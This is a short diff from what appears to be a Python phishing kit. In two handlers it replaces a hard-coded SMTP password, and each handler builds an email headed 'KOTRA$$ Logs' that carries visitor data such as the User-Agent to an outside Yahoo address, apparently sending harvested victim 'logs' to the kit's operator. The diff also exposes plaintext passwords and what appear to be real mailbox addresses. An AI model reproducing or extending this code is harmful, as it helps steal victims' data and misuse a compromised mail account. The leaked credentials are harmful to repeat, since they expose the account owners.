@@ -194,7 +194,7 @@ def first():
         sender_email = "vigilancia@coopvillalosangeles.org"
         sender_emaill = "vigilancia"
         receiver_email = "edwinpowell0113@yahoo.com"
-        password = "Evelyn19271534"
+        password = "q1w2e3r4t5+-*/"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -234,7 +234,7 @@ def second():
         sender_email = "vigilancia@coopvillalosangeles.org"
         sender_emaill = "vigilancia"
         receiver_email = "edwinpowell0113@yahoo.com"
-        password = "Evelyn19271534"
+        password = "q1w2e3r4t5+-*/"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
